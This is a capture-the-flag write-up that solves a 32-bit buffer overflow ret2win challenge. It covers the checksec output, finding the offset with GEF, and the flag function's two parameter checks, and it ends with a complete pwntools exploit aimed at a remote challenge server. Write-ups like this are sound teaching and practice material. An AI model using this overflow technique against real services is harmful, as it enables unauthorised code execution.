# You Know 0xdiablos
`Buffer Overflow` `32-Bits Binary` `Calling Convention`
<br>
<br>

First thing first, we are going to check the security for this binary using `checksec`, by doing that, we can get a clear information of what we're working with.

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

We can see that we're working with a `32-bits` binary with `partial RELRO` and no other security setted up. Using gdb with GEF, I tried to list what function does the binary have, and found a function called `flag`, I tried to disas the main function but didn't find the `flag` function to be called anywhere, so I assume this is a `ret2win` in a 32-bits binary.

Next step is finding the padding, using GEF is kinda simple, you just need to use `pattern create` then copy the pattern created, run the binary, and paste the pattern, eventually it'll hit he limit.

```
gef➤  pattern offset $esp
[+] Searching for '$esp'
[+] Found at offset 192 (little-endian search) likely
```

We can see that the offset is 192, but don't forget, in 32-bits binary, the esp offset includes the eip in it, so the actual offset is `offset - 4` or `188`.

Before I jump to the flag function, I'd checked the flag function, it requires 2 parameters to be fulfilled in order to print the flag, those are:

```
   0x08049246 <+100>:	cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x0804924d <+107>:	jne    0x8049269 <flag+135>
   0x0804924f <+109>:	cmp    DWORD PTR [ebp+0xc],0xc0ded00d
   0x08049256 <+116>:	jne    0x804926c <flag+138>
```

With the informations we've gathered, we can try to build the payload now, the payload will look like this

```
payload = offset + address of flag + padding + param 1 + param 2
```

**Quick Explanation**  
Once we pop the `address of flag` the eip need to be filled with something, here is where our padding do the job filling the 4 bytes empty space at eip.

Final Exploit:

```python
from pwn import *

binary = ('./vuln')
elf = context.binary = ELF(binary, checksec=False)

#p = process(binary)
p = remote('178.128.42.95',31777)

p.recv()

payload = b'a'*(192-4)
payload+= p32(elf.sym['flag'])
payload+= b'a'*4
payload+= p32(0xdeadbeef)
payload+= p32(0xc0ded00d)

p.sendline(payload)

p.interactive()
```

Run the Exploit to the server and we got the flag.